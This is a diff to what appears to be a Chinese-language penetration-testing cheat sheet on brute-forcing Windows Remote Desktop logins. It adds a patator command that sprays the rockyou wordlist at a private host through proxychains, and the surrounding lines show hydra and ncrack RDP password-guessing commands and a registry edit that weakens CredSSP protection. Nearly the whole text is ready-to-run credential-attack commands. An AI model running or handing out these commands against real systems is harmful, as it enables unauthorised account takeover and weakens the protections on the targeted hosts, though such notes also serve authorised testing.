@@ -54,6 +54,12 @@ hydra -l wenber -V -x 3:3:1 rdp://127.0.0.1:3389
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /t reg_dword /v AllowEncryptionOracle /d 2
 ```
 
+## rdp/patator
+```sh
+# 图形界面使用
+proxychains python3 patator.py rdp_login host=172.22.4.45 user=Adrian password=FILE0 0=/home/parallels/tool/rockyou.txt
+```
+
 ## rdp/hydra
 
 ```sh
@@ -77,6 +83,7 @@ ncrack -p 3389 -v -user admin -pass 123456Aa@@ 192.168.52.143
 # -T<0-5> 越高越快
 ncrack -p 3389 -v -user admin -P ./6位数字.txt 192.168.52.143 -T2 -oN output.txt
 ```
+
 
 # medusa
 medusa 比 hydra快一些
